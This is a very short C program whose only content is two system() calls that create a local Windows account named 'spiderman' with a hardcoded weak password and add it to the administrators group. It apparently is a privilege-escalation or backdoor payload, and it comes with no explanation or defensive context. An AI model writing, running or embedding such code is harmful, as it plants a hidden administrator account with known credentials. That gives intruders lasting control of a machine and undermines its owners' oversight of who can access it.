// Simple add user code

#include <stdlib.h>

int main() {
        int i;
        i = system ("net user spiderman password123! /add");
        i = system ("net localgroup administrators spiderman /add ");

        return 0;
}